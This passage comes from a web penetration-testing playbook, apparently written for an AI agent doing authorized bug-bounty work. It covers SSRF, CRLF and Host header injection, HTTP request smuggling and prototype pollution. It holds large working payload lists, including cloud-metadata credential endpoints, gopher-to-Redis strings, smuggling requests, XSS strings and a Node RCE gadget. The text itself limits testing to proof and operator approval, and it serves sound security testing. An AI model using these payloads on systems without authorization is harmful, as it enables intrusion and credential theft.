the app and you get file read with no traversal characters in any filename.

**Confirm.**
1. File content in the response that the app cannot legitimately produce (`root:x:0:0`, `[fonts]` from
   `win.ini`, base64 that decodes to PHP source).
2. Control: same path with a nonexistent file → different status/length. Shows the path is real.
3. For blind write-side traversal: read the file back via the app or via HTTP.
4. Save request and the first 5 lines of the file only.

**Escalate — stop at proof.** Read `/etc/passwd` or `win.ini` → read the app config to show secret exposure
(redact) → if RCE via log/session poisoning is reachable, one `id` and stop. Do not walk the filesystem,
do not read other tenants' uploads, do not read SSH keys or cloud credential files beyond noting they are
reachable (`../CLAUDE.md` 2 and 4).

**Commonly missed.**
- `php://filter`. Testers try `../../../etc/passwd`, get blocked by a basedir restriction, and stop —
  while `php://filter/...resource=config.php` works and hands over the DB password.
- The extension-append case. `include($p.'.php')` makes every `/etc/passwd` attempt fail; a traversal to
  another `.php` file (`../../config`) still works and still proves it.
- Upload filenames. Everyone checks the file bytes and ignores `filename=`.
- Zip-slip and symlink members. Almost never tested, and extraction features are common (themes, plugins,
  backups, imports, CI artifacts).
- Object-store keys: `../` inside an S3/GCS key can escape the tenant prefix. That reads as access control
  but the vector is traversal.
- Windows ADS `::$DATA` to read source instead of executing it.
- `..;/` on Tomcat/Java and `;` path parameters generally — bypasses path-based auth and traversal filters.
- Second-order: filename stored, then used by a download endpoint elsewhere (3.21).

---

## 3.11 SSRF as URL injection

**What it is.** You control a URL, host, or scheme that the server fetches.

**Where it hides.**

| Feature | Parameter names |
|---|---|
| Webhooks, callbacks, notification endpoints | `url`, `callback`, `webhook`, `notify_url`, `endpoint`, `target` |
| "Import from URL", link preview, unfurl, OG scraper | `url`, `link`, `src`, `uri`, `feed`, `rss` |
| Avatar / image by URL, favicon fetcher | `image`, `avatar_url`, `img`, `logo` |
| PDF/screenshot generation from a URL | `url`, `page`, `html` — also 3.20 |
| File upload by URL, S3/GCS copy | `source`, `from`, `remote` |
| OAuth / OIDC / SAML: `redirect_uri`, `jwks_uri`, `issuer`, metadata URL | server-side fetch of `jwks_uri` is a real SSRF |
| Proxy endpoints (`/api/proxy?url=`, `/fetch?u=`) | designed-in SSRF |
| SSO / LDAP / SMTP / DB connection settings in admin panels | host fields |
| XML `SYSTEM` entities, XQuery `doc()`, `xsl:import` | see 3.6, 3.9 |
| HTML→PDF `<img src>`, `<iframe>`, `<link>` | see 3.20 |
| `Referer`-based analytics fetchers, `X-Forwarded-Host` in link building | header-borne |
| Git/npm/pip/maven "install from" URLs in CI features | |
| Zapier-style integrations, custom API base URL fields | |
| `sourceMappingURL`, `Content-Security-Policy report-uri` echo | rare but real |

**Detect.** Start with your own canary host — always. It proves fetch without touching internals.
```
http://CANARY.oast.fun/
https://CANARY.oast.fun/
//CANARY.oast.fun/
http://CANARY.oast.fun:80/x?src=paramname
```
Then loopback and parser confusion:
```
http://127.0.0.1/
http://localhost/
http://127.0.0.1:80/
http://0.0.0.0/
http://[::1]/
http://[::ffff:127.0.0.1]/
http://127.1/
http://127.0.1/
http://2130706433/
http://0x7f000001/
http://0177.0.0.1/
http://0000::1/
http://127.0.0.1.nip.io/
http://localtest.me/
http://spoofed.CANARY.oast.fun/          (A record -> 127.0.0.1)
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://①②⑦.⓿.⓿.⓵/
```
Parser confusion — the allowlist sees one host, the HTTP client sees another:
```
http://CANARY.oast.fun@169.254.169.254/
http://169.254.169.254#CANARY.oast.fun/
http://CANARY.oast.fun:@169.254.169.254/
http://169.254.169.254%2523@CANARY.oast.fun/
http://expected.com@169.254.169.254/
http://expected.com%40169.254.169.254/
http://169.254.169.254%00.expected.com/
http://expected.com.169.254.169.254.nip.io/
http://169.254.169.254\@expected.com/
http://expected.com\@169.254.169.254/
http://expected.com:80\@169.254.169.254/
https://expected.com%09@169.254.169.254/
http://169.254.169.254?x=.expected.com
http://169.254.169.254/?@expected.com
http://[::169.254.169.254]/
http://169.254.169.254./
http://169.254.169.254%E3%80%82/          ideographic full stop -> '.'
http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/
http://evil.com%2523.expected.com/
```
Allowlist-prefix defeats:
```
https://expected.com.CANARY.oast.fun/
https://CANARY.oast.fun/expected.com
https://expected.com%2F@CANARY.oast.fun/
https://CANARY.oast.fun/?x=expected.com
https://expected.com-CANARY.oast.fun/
```
Redirect chains (the fetcher follows, the validator does not):
```
http://CANARY.oast.fun/r?to=http://169.254.169.254/latest/meta-data/
```
Serve a 302, a 307 (preserves method and body), and a meta-refresh. Also chain twice — some clients cap
at one redirect during validation but follow more at fetch time. `https://` → `http://` downgrade
redirects break some allowlists.

DNS rebinding, for TOCTOU validators:
```
http://make-127-0-0-1-rebind-to-A.CANARY.oast.fun/
```
Use a rebinding service or your own DNS with a 0-TTL A record alternating between a public IP and
`127.0.0.1`. This is the answer to "the app resolves and checks the IP, then fetches again".

**Blind SSRF detection.** The response is discarded. You need OOB (`03-bypass-and-blind.md`):
1. DNS-only canary: `http://<uniq>.CANARY.oast.fun/` — a DNS lookup with no HTTP hit still proves the
   server resolved your name (filter blocked the connection, not the parse).
2. HTTP hit = full fetch. Note the User-Agent — it names the library (`python-requests`, `Go-http-client`,
   `Java/1.8`, `curl/7`, `wkhtmltopdf`), which tells you which parser quirks apply.
3. Timing differential for internal ports without egress: `http://127.0.0.1:22/` (fast RST vs slow
   timeout). See the ROE note below before doing any of this.
4. Error-message differential: `connection refused` vs `timeout` vs `400` leaks reachability.

**Cloud metadata.** One request each, read-only.

| Cloud | Endpoint |
|---|---|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` |
| AWS IMDSv1 creds | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| AWS user-data | `http://169.254.169.254/latest/user-data` |
| AWS IMDSv2 | `PUT http://169.254.169.254/latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds: 21600`, then `X-aws-ec2-metadata-token` on GET — needs header control, so gopher/request-splitting or a proxy feature |
| AWS ECS task metadata | `http://169.254.170.2/v2/credentials/<uuid>`, `${ECS_CONTAINER_METADATA_URI_V4}` |
| AWS EKS / IRSA | token file at `/var/run/secrets/eks.amazonaws.com/serviceaccount/token` (via LFI, 3.10) |
| GCP | `http://metadata.google.internal/computeMetadata/v1/?recursive=true` with `Metadata-Flavor: Google` |
| GCP (no header needed, legacy) | `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token` |
| GCP alt hosts | `http://169.254.169.254/`, `http://metadata/computeMetadata/v1/` |
| Azure IMDS | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` with `Metadata: true` |
| Azure (token) | `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` |
| Alibaba | `http://100.100.100.200/latest/meta-data/` , `.../ram/security-credentials/` |
| DigitalOcean | `http://169.254.169.254/metadata/v1.json` |
| Oracle OCI | `http://169.254.169.254/opc/v2/instance/` with `Authorization: Bearer Oracle` |
| Oracle OCI (v1) | `http://169.254.169.254/opc/v1/instance/` |
| Hetzner | `http://169.254.169.254/hetzner/v1/metadata` |
| Kubernetes API | `https://kubernetes.default.svc/api/v1/namespaces` |
| Docker socket (via gopher/unix) | `http://localhost:2375/containers/json` |
| Consul / Nomad | `http://127.0.0.1:8500/v1/agent/self` , `:4646/v1/agent/self` |

RISK / ROE: retrieving IAM credentials is proof; **using** them is lateral movement and out of bounds
(`../CLAUDE.md` 2). If the credentials endpoint returns keys, capture the response, redact the secret in
the report (show the AccessKeyId prefix and the role name only), and stop. Do not call `sts get-caller-identity`
with them unless the program explicitly asks for it in writing.

**Internal network scanning is outside ROE.** Do not sweep RFC1918 ranges or port ranges through the SSRF.
Instead:
- Fetch `http://127.0.0.1/` and `http://localhost/` (one request each) to show loopback reach.
- Read `/proc/net/tcp` via an LFI if you have one (3.10), or read the app's own config, to *learn* internal
  hosts instead of scanning for them.
- Try at most a handful of named, high-signal targets: `127.0.0.1:80`, `:8080`, `:8000`, `:3000`,
  `:9200` (Elasticsearch), `:6379` (Redis), `:2375` (Docker), `:8500` (Consul), `:15672` (RabbitMQ),
  `:5000` (registry), `:9090`/`:9100` (Prometheus), the cloud metadata IP. Document each as one request.
- Ask the operator before anything broader.

**Protocol smuggling.**
```
file:///etc/passwd
file://localhost/etc/passwd
file:///c:/windows/win.ini
dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats
gopher://127.0.0.1:6379/_INFO%0d%0a
gopher://127.0.0.1:11211/_%0d%0astats%0d%0a
gopher://127.0.0.1:25/_HELO%20x%0d%0aQUIT%0d%0a
ldap://127.0.0.1:389/%0astats%0a
sftp://CANARY.oast.fun:22/
tftp://CANARY.oast.fun:69/x
netdoc:///etc/passwd
jar:http://CANARY.oast.fun/x.zip!/
jar:file:///etc/passwd!/
imap://127.0.0.1:143/
smb://CANARY.oast.fun/x
php://filter/convert.base64-encode/resource=http://127.0.0.1/
```
Scheme-support tells you the client: `file:`/`dict:`/`gopher:` = libcurl (PHP, some Ruby);
`jar:`/`netdoc:` = Java; `file:` only = most others.

RISK: gopher to Redis/Memcached/SMTP can *write* data (`SET`, `CONFIG SET`, sending mail). Proof stops at
a read command — `INFO`, `stats`, `HELO`+`QUIT`. Never `FLUSHALL`, `CONFIG SET dir`, `SLAVEOF`, or a
crafted `SET` that plants a cron entry or a webshell; and never relay mail. If a write is clearly possible,
say so in the finding and stop.

**Confirm.**
1. Canary hit with a unique subdomain per (vector, payload) (3.23). DNS-only vs DNS+HTTP distinguishes
   "resolved" from "fetched".
2. Response content from an internal host appearing in the app's response (full-read SSRF), or a
   deterministic error/timing difference (blind).
3. Control: a payload pointing at a nonexistent canary subdomain must produce the *same* app response but
   no callback — proves the callback is caused by your input.
4. Confirm it is server-side: the callback source IP is the target's egress, not your browser.

**Escalate — stop at proof.** Canary fetch → loopback reach (one request) → metadata endpoint if it is a
cloud host (capture, redact, stop) → name one internal service you reached from config knowledge. Write the
finding with the Server/User-Agent evidence. Do not scan, do not use credentials, do not pivot.

**Commonly missed.**
- DNS-only hits. No HTTP callback is read as "not vulnerable" when it actually means the fetch was blocked
  after resolution — still a finding on many programs, and the basis for a rebinding bypass.
- Non-URL parameters: a hostname field, a port field, a "S3 bucket name", a `jwks_uri`, an SMTP host in
  settings. No `http://` in sight.
- `redirect_uri` on OAuth where the server fetches it (some implementations do).
- 307/308 redirects preserving POST bodies — turns a GET-only SSRF into one that can talk to Redis.
- Second-order: the URL is stored and fetched by a background job minutes later. Without a canary you will
  never attribute the hit (3.23, and 3.21).
- Blind SSRF through an image/PDF renderer where the only evidence is the rendered artifact.
- IPv6 and decimal/octal IP encodings against allowlists that only regex dotted-quad.
- `X-Forwarded-Host` / `Referer` reaching a server-side fetcher (link unfurling, analytics).

---

## 3.12 CRLF injection, header injection, response splitting

**What it is.** A `\r\n` in your input ends a header line and lets you add headers or a body.

**Where it hides.**
- `Location:` built from input: `?next=`, `?redirect=`, `?url=`, `?returnTo=`, `?continue=`, `?back=`.
- `Set-Cookie:` built from input: language/theme/tenant preference, tracking IDs, "remember my choice".
- Custom response headers echoing a request value: `X-Request-Id`, `X-Correlation-Id`, `X-Trace`,
  `X-Amz-Meta-*` on presigned uploads, `Content-Disposition` filename on downloads.
- Log lines (see 3.18 for log-specific impact).
- Email headers: contact forms, invite, password reset, "share this", `Reply-To` from user input.
- Reverse-proxy / CDN configs that copy a request header into a response or an upstream request.
- SMTP/LDAP/Redis protocol lines (`\r\n` injection into any line-based protocol; see 3.2 Redis, 3.11 gopher).

**Detect.** Encodings, one per request, then look at the **raw** response headers (`curl -is`).
```
%0d%0aX-Canary:%20abc123
%0aX-Canary:%20abc123
%0dX-Canary:%20abc123
%23%0d%0aX-Canary:abc123
%250d%250aX-Canary:abc123
%%30%61X-Canary:abc123
%E5%98%8A%E5%98%8DX-Canary:abc123          (UTF-8 overlong CR/LF, Java/Node URL decoders)
%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8DX-Canary:abc123
\r\nX-Canary:abc123
%0d%0a%09X-Canary:abc123                   (tab continuation)
%0d%0a%20X-Canary:abc123
%u000d%u000aX-Canary:abc123
%c4%8d%c4%8aX-Canary:abc123
```
Full response splitting (only where the whole body can be forged):
```
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a<html>CANARY</html>
```
Cookie injection (session fixation, and a path to XSS on sites that trust cookie values):
```
%0d%0aSet-Cookie:%20canary=abc123
%0d%0aSet-Cookie:%20session=attacker;%20Path=/
```
Header-injection-to-XSS chain (when you can add `Content-Type` and a body):
```
%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<svg%20onload=alert(document.domain)>
```
Also test the *cookie value* path specifically:
```
lang=en%0d%0aX-Canary:abc
lang=en%0aSet-Cookie:%20x=1
```

**Email header injection.** Contact/reset/invite forms; put these in name, subject, or the email field:
```
victim@example.com%0aBcc:%20canary@CANARY.oast.fun
victim@example.com%0d%0aBcc:%20canary@CANARY.oast.fun
victim@example.com%0aCc:%20canary@CANARY.oast.fun
victim@example.com\nBcc: canary@CANARY.oast.fun
"name%0aBcc:canary@CANARY.oast.fun"@example.com
victim@example.com%0aSubject:%20CANARY
victim@example.com%0aContent-Type:%20text/html%0a%0a<b>CANARY</b>
victim@example.com%0aX-Canary:%20abc
victim@example.com%0a.%0aMAIL FROM:<x@y>%0aRCPT TO:<canary@CANARY.oast.fun>%0aDATA%0a
```
And in the *name* field, which is interpolated into `From:`/`Reply-To:`:
```
Bob%0aBcc:canary@CANARY.oast.fun
Bob <x@y>, canary@CANARY.oast.fun
```
RISK: do not send mail to anyone but your own canary mailbox. Never inject a third party's address —
that is sending unsolicited mail from the target's domain. Use a mailbox you control
(`interactsh` gives you one, or use a catch-all you own).

**Confirm.**
1. Your header appears in the raw response as a real header (`curl -is | grep -i x-canary`) — not inside a
   body or as an escaped string.
2. The control request with `X-Canary:abc123` and no CRLF must not produce the header.
3. For email: the message arrives at the canary mailbox with the injected header present in the raw source.
4. Save raw response including headers.

**Escalate — stop at proof.** One injected benign header → show a `Set-Cookie` can be injected → if a full
split is possible, demonstrate it against **your own** request only and say cache poisoning is likely
without performing it (3.13). Impact statement: session fixation, XSS via injected `Content-Type`+body,
or cache poisoning potential. Do not poison a shared cache.

**Commonly missed.**
- Looking at the rendered page instead of raw headers. `curl -is` or Burp's raw view, always.
- `%0d` alone or `%0a` alone. Many stacks split on a bare LF, and filters only look for the pair.
- The UTF-8 overlong / `%E5%98%8A` form. Node and some Java decoders map those to CR/LF and no WAF rule
  covers them.
- Cookie *values* as a sink, and `Content-Disposition` filenames on download endpoints.
- Email header injection. Contact forms are dismissed as low value; a `Bcc:` from the target's own domain
  is a real finding and often the only bug on a marketing site.
- A 302 whose `Location` is filtered for `javascript:` but not for `%0d%0a`.

---

## 3.13 Host header injection

**What it is.** The app trusts the `Host` (or a forwarding header) to build absolute URLs, route requests,
or pick a tenant.

**Where it hides.**
- Password reset emails, email verification, invite links, magic links.
- Any absolute URL in a response body, email, or `Location` header.
- Multi-tenant routing by hostname.
- Reverse proxies that route on `Host`, `X-Forwarded-Host`, or `X-Forwarded-Server`.
- Cache keys that exclude `Host` but responses that include it.
- OAuth/OIDC issuer and redirect construction.
- SSO metadata endpoints, `.well-known/openid-configuration` built from the request.

**Detect.** Header variations, one per request. Watch where the value lands.
```
Host: CANARY.oast.fun
Host: target.com
X-Forwarded-Host: CANARY.oast.fun
X-Forwarded-Host: CANARY.oast.fun, target.com
X-Host: CANARY.oast.fun
X-Forwarded-Server: CANARY.oast.fun
X-HTTP-Host-Override: CANARY.oast.fun
X-Original-Host: CANARY.oast.fun
Forwarded: host=CANARY.oast.fun
X-Forwarded-Proto: http
X-Forwarded-Port: 1337
X-Original-URL: /admin
X-Rewrite-URL: /admin
```
Duplicate and malformed Host:
```
Host: target.com
Host: CANARY.oast.fun

Host: target.com, CANARY.oast.fun
Host: target.com
 Host: CANARY.oast.fun        (line-folded second header)
Host: CANARY.oast.fun:80
Host: target.com:@CANARY.oast.fun
Host: target.com
X-Forwarded-Host: CANARY.oast.fun
```
Absolute-URI request line (bypasses many Host checks):
```
GET https://CANARY.oast.fun/reset HTTP/1.1
Host: target.com
```
Port and path injection in the Host value:
```
Host: target.com:1337
Host: target.com/../x
Host: target.com?x=
Host: target.com#x
```

**Password reset poisoning.** The full test, on your own account only:
1. Request a reset for **your own** test account with `X-Forwarded-Host: CANARY.oast.fun`.
2. Read your inbox. If the link points at the canary host, it is confirmed.
3. If the link is correct but the email contains the canary anywhere else (a logo URL, an unsubscribe
   link), that is partial — report it as such.
4. If the app validates `Host` but not `X-Forwarded-Host`, that is still the bug.
Do **not** request resets for other users' accounts. That is sending mail to third parties and collecting
their tokens.

**Routing-based SSRF.** A front-end proxy forwards based on `Host`, so a private hostname reaches an
internal service:
```
Host: internal-app
Host: localhost
Host: 127.0.0.1
Host: 169.254.169.254
Host: CANARY.oast.fun
```
Signal: a different application answers (different `Server`, different 404 body, a redirect to an internal
name). Then treat it as 3.11 for ROE — no scanning, a handful of named targets, ask before more.

**RISK — cache poisoning.** Injecting a header that gets cached affects every other user of that cache
entry. That is impact on third parties and many programs forbid it.

The safe test:
1. Add a cache-buster you own: `?cb=CANARY1234` (or a unique path). This makes a **private** cache entry
   that only your buster reaches.
2. Send the poisoning header with the buster. Check for `X-Cache: miss` then `X-Cache: hit` on a repeat.
3. Confirm the injected value is in the cached response for `?cb=CANARY1234`.
4. Confirm the cache key excludes your header by showing two different headers produce the same cached
   response *for the same buster*.
5. Report it as "cache poisoning via unkeyed `X-Forwarded-Host`, demonstrated on a self-chosen cache key".
Never poison the bare homepage, a shared asset, or any URL other users request. Never poison with a payload
that would execute (`<script>`) on a shared key. If you cannot demonstrate it with a buster, ask the
operator before going further.

Also check `Vary:` and the cache headers to state which keys are unkeyed. Unkeyed-header discovery
(`param-miner` style) is noisy — rate-limit it and keep the buster in every request.

**Confirm.**
1. The canary host appears in a response body, a `Location`, or an email you received.
2. Control request with the real Host produces the real host.
3. For routing SSRF: a response that could not have come from the public app.
4. Save the request with the exact header and the resulting email/response.

**Escalate — stop at proof.** Reset poisoning on your own account with the token captured at your canary
(state that account takeover follows, do not do it to anyone else) → routing SSRF to one named internal
service → cache poisoning with a self-keyed buster. Stop.

**Commonly missed.**
- Testing only `Host` and not `X-Forwarded-Host`. Most apps behind a proxy validate `Host` and trust the
  forwarding header blindly.
- The email's *other* links. The reset link is hardened; the logo, unsubscribe, and support links are not,
  and they leak the token in a `Referer` when clicked.
- Duplicate `Host` headers and the absolute-URI request line.
- `X-Forwarded-Proto: http` downgrading links, which strips `Secure` behaviour and enables interception —
  small, but reportable.
- `X-Original-URL` / `X-Rewrite-URL` reaching a Symfony/IIS-style router — path override, sometimes auth
  bypass (out of scope per `../CLAUDE.md` 1, but note it if it delivers injection surface).
- Poisoning a shared cache "just to check". Use the buster.

---

## 3.14 HTTP request smuggling

**RISK — read this before anything else in this card.** Smuggling desynchronises a connection that other
users share. A successful test can serve your request's response to a stranger, poison a queue, or hang a
front-end socket. Many bug bounty programs **forbid** it outright, and several that allow it require a
dedicated test host.

Rules for this card:
- Check `targets/<target>/scope.md` for an explicit permission. If it does not say smuggling is allowed,
  **ask the operator first** (`../CLAUDE.md` 4). Do not "just check quickly".
- Detection is timing-based only until permitted. Never send a payload whose smuggled prefix would be
  prepended to a real user's request.
- Never smuggle a request with side effects (POST to anything that writes).
- Never leave a socket in a desynced state: after any confirmed differential, stop using that connection.
- Do not run `smuggler.py`/`h2csmuggler`/Burp's scanner in full-auto against production without permission.

**What it is.** Front-end and back-end disagree about where one request ends.

**Where it hides.** Any target with a CDN, WAF, load balancer, API gateway, or a reverse proxy in front,
especially HTTP/2 at the edge and HTTP/1.1 upstream. Signals worth noting in the ledger: `Via`,
`X-Cache`, `CF-Ray`, `X-Amz-Cf-Id`, `Server: AkamaiGHost`, `X-Served-By`, two different `Server` values on
different paths, and any endpoint that behaves differently on a keep-alive connection.

**The variants.**

| Name | Front-end uses | Back-end uses | Shape |
|---|---|---|---|
| CL.TE | `Content-Length` | `Transfer-Encoding` | FE sends whole body, BE stops at `0\r\n\r\n`, remainder is a prefix |
| TE.CL | `Transfer-Encoding` | `Content-Length` | FE dechunks, BE reads CL bytes, remainder is a prefix |
| TE.TE | both, one is obfuscated | the other | obfuscate `TE` so one side ignores it |
| CL.0 | `Content-Length` | ignores body entirely | body becomes the next request |
| 0.CL | ignores body | `Content-Length` | reverse of CL.0 |
| H2.CL | HTTP/2 (implicit length) | HTTP/1.1 `Content-Length` | downgrade, injected CL |
| H2.TE | HTTP/2 | HTTP/1.1 `Transfer-Encoding` | downgrade, injected TE |
| H2 header/request splitting | HTTP/2 headers allow CRLF in values | HTTP/1.1 | CRLF in an h2 header name/value forges a whole request |

**TE obfuscation set** (for TE.TE):
```
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding:[tab]chunked
Transfer-Encoding: chunked[space]
[space]Transfer-Encoding: chunked
Transfer-Encoding: "chunked"
Transfer-Encoding: chunk
Transfer-Encoding: CHUNKED
Transfer-Encoding
 : chunked
Transfer-Encoding: identity, chunked
Transfer-Encoding: chunked, identity
X: X[\n]Transfer-Encoding: chunked
Transfer_Encoding: chunked
Transfer-Encoding:\x0bchunked
```

**Detect — timing only. The only probe to run before permission is granted.** These cause a *timeout on your
own connection* and do not inject a prefix into anyone else's request.

CL.TE timing probe (front-end uses CL, back-end waits for a chunk that never comes):
```
POST /x HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```
Send with `Connection: close`. A hang of ~the back-end read timeout = CL.TE.

TE.CL timing probe (front-end dechunks, back-end waits for more bytes):
```
POST /x HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```
A hang = TE.CL.

Baseline both against a normal request on the same connection. A slow app fakes both.

**The differential — the real confirmation.** Only with permission. The safe form uses **two of your own
requests on your own connection** and shows the second one gets a response affected by your prefix:
```
POST /x HTTP/1.1
Host: target.com
Content-Length: 41
Transfer-Encoding: chunked

0

GET /404-canary-abc123 HTTP/1.1
X: y
```
Then immediately send, on the same connection:
```
GET /x HTTP/1.1
Host: target.com

```
If the second response is a 404 for `/404-canary-abc123`, or the response is for a path you did not
request, you have a confirmed desync. Use a **404 path**, never a POST, never an admin path. That is the
whole proof.

Anything that captures another user's request, steals a cookie, or poisons a cache is out of bounds here
even on a permitted program unless the program's policy names it. Report the desync and let them ask for more.

**H2 downgrade probes.** Requires an HTTP/2 client that lets you set malformed pseudo/regular headers
(Burp with "Allow HTTP/2 ALPN override" and inspector-level editing).
```
H2.CL:   send h2 request with header  content-length: 0  and a body containing a smuggled request
H2.TE:   send h2 request with header  transfer-encoding: chunked  and a chunked body
h2 CRLF: header name  foo  value  bar\r\nX-Canary: 1        -> check for X-Canary in the upstream view
h2 CRLF: header value  bar\r\n\r\nGET /404-canary HTTP/1.1\r\nHost: target.com\r\nX: 
h2 :path with a space or CRLF, :method with a space
h2 header with an uppercase name (illegal in h2, sometimes forwarded)
```
The h2 CRLF variants also give plain response splitting (3.12) with no desync — try those first because
they are lower risk.

Also check for `h2c` upgrade smuggling:
```
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```
A `101 Switching Protocols` from the edge means you can tunnel past it. That itself is the finding.

**Confirm.**
1. Timing: reproducible hang on the differential probe, no hang on the control (same request with matching
   CL/TE), three times.
2. Differential: your own second request returns a response for the smuggled canary path.
3. Record the exact bytes. Smuggling reports are rejected without byte-exact reproduction — save the raw
   request with `\r\n` shown explicitly.

**Escalate — stop at proof.** The desync itself is the maximum you demonstrate. State the theoretical
impact (request queue poisoning, cache poisoning, front-end auth bypass) without performing it. Do not
attempt to capture another user's request.

**Commonly missed.**
- CL.0 and 0.CL. Everyone tests CL.TE/TE.CL and stops. CL.0 against endpoints that ignore bodies
  (static files, redirects, `OPTIONS`) is common on modern stacks.
- H2 CRLF header injection, which gives full request forging with no chunked trickery.
- `h2c` upgrade.
- Testing only `/`. Different back-ends serve different paths; a desync may exist only on `/api/`.
- Treating a hang as confirmation. A hang on a slow endpoint is not a differential; you need the control.
- Running it at all without checking the program policy.

---

## 3.15 Prototype pollution

**What it is.** Setting `__proto__`, `constructor.prototype`, or `constructor` on an object mutates
`Object.prototype`, changing behaviour everywhere. Node and browser JS.

**Where it hides.**

| Sink | Shape |
|---|---|
| JSON body merged into config/options | `Object.assign({}, defaults, req.body)`, `_.merge`, `_.defaultsDeep`, `$.extend(true,...)`, `deepmerge`, `merge-deep`, `mixin-deep`, `set-value`, `dot-prop`, `flat`, `unflatten`, `object-path` |
| Query-string parsing | `qs`, `express` default parser: `?__proto__[x]=y`, `?a[__proto__][b]=c` |
| Path-based setters | `lodash.set(obj, req.body.path, v)` with `path="__proto__.x"` |
| Config loaders taking JSON/YAML/INI | `ini` package, `properties`, `nconf` |
| CSV/spreadsheet importers building objects from headers | header named `__proto__` |
| Client-side: URL hash/query parsed into an options object | jQuery, Sentry, AngularJS, analytics SDKs |
| GraphQL variables merged into a context object | |
| Cookie parsers, header parsers | `cookie` name `__proto__` |
| `JSON.parse` + recursive copy | any hand-rolled deep clone |

**Detect — server side.** Send a pollution payload, then look for a behaviour change. Non-destructive
probes use a key the app does not use.
```json
{"__proto__":{"canaryXYZ":"polluted"}}
{"__proto__":{"__proto__":{"canaryXYZ":"polluted"}}}
{"constructor":{"prototype":{"canaryXYZ":"polluted"}}}
{"a":{"__proto__":{"canaryXYZ":"polluted"}}}
{"__proto__.canaryXYZ":"polluted"}
{"__proto__":["polluted"]}
```
Query-string forms:
```
?__proto__[canaryXYZ]=polluted
?__proto__.canaryXYZ=polluted
?a[__proto__][canaryXYZ]=polluted
?constructor[prototype][canaryXYZ]=polluted
?__proto__[]=polluted
```
Now detect the pollution. Best server-side oracles, in order of safety:

1. **Status-code / parse oracle.** Pollute a property that changes JSON or HTTP behaviour, using a value
   that only affects *your* next request in the same process:
```json
{"__proto__":{"status":510}}
{"__proto__":{"statusCode":510}}
```
   Then make any request that returns an error object. A `510` you never asked for confirms it.
2. **Header reflection oracle.**
```json
{"__proto__":{"x-canary-hdr":"abc123"}}
{"__proto__":{"headers":{"x-canary-hdr":"abc123"}}}
```
   Then look for `x-canary-hdr` in a subsequent response.
3. **Body-parser oracle** (Express `body-parser` uses `Object.prototype` lookups):
```json
{"__proto__":{"content-type":"application/json"}}
```
   Then send a request with a malformed/absent `Content-Type` and see whether it now parses.
4. **`json spaces` oracle** (Express-specific, harmless and very reliable):
```json
{"__proto__":{"json spaces":10}}
```
   Every later JSON response is pretty-printed with 10-space indent. Response length jumps. This is the
   cleanest server-side confirm there is.
5. **Parameter-limit / allow-list oracle.**
```json
{"__proto__":{"parameterLimit":1}}
```
6. **DNS oracle for the RCE gadget class** (only where you already have a confirm, and only DNS):
```json
{"__proto__":{"shell":"node"}}
{"__proto__":{"execArgv":["--eval=require('dns').lookup('CANARY.oast.fun',()=>{})"]}}
{"__proto__":{"env":{"NODE_OPTIONS":"--require=/tmp/x"}}}
```
RISK: `shell`/`execArgv`/`NODE_OPTIONS` gadgets pollute the process for **every** request until restart —
that is a global behaviour change affecting other users and can crash the app. Do not use them on
production. Confirm with `json spaces` or a header oracle and report. If the program wants RCE proof, ask
the operator first (`../CLAUDE.md` 4).

RISK: `{"__proto__":{"toString":"x"}}`, `{"__proto__":{"length":0}}`, `{"__proto__":{"then":1}}` and
similar break the whole process. Avoid — they are a DoS.

**Detect — client side.** Append to the URL and watch for the gadget firing:
```
?__proto__[test]=canary
?__proto__.test=canary
#__proto__[test]=canary
?constructor[prototype][test]=canary
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[srcdoc]=<script>alert(1)</script>
?__proto__[src]=data:,alert(1)
?__proto__[onerror]=alert(1)
?__proto__[url]=javascript:alert(1)
?__proto__[data]=//CANARY/x
?__proto__[value]=javascript:alert(1)
?__proto__[hitCallback]=alert(1)         (old analytics gadget)
?__proto__[sanitize]=false
?__proto__[allowedTags][]=script
?__proto__[ALLOWED_TAGS][]=script        (DOMPurify config gadget)
?__proto__[preventAssignment]=1
?__proto__[template]=<img src=x onerror=alert(1)>
?__proto__[defaults][template]=...
```
In the console, confirm pollution directly:
```js
Object.prototype.test          // 'canary' if polluted
({}).test
```
Then hunt gadgets: search the loaded bundles for `||`, `??`, `in`, and property reads with no `hasOwnProperty`
guard — `jsluice` and the browser's own coverage view help. Known gadget libraries to grep for in bundles:
`jquery`, `sanitize-html`, `DOMPurify` (config), `handlebars`, `pug`, `mustache`, `marked`,
`google-analytics`, `Sentry`, `adobe/launch`, `wistia`, `embedly`.

**Confirm.**
1. Server: `json spaces` (length change) or an injected header appears, and a control request without the
   payload does not show it. Note that the effect may be process-global — say so in the report, and
   re-check after a few minutes to see whether it persisted.
2. Client: `Object.prototype.<key>` is set in the console, plus a gadget that produces a concrete effect
   (script execution → cross-reference 3.16).
3. Save both requests and the console output.

**Escalate — stop at proof.** Pollution confirmed → one gadget showing real impact (XSS on the client,
response manipulation on the server) → state the RCE gadget class exists without firing it. Then, if the
pollution is process-global, tell the operator so the program can be notified that a restart clears it.

**Commonly missed.**
- Server-side entirely. Most testers only do the client-side URL trick.
- The query-string vector on Express: `?__proto__[x]=y` needs no JSON body at all.
- `constructor[prototype]` when `__proto__` is filtered by a key blocklist.
- Pollution without a gadget being called "not exploitable". Report it; gadgets appear with every new
  dependency.
- CSV/XLSX import where a column header is `__proto__` (ties to 3.17 and 3.21).
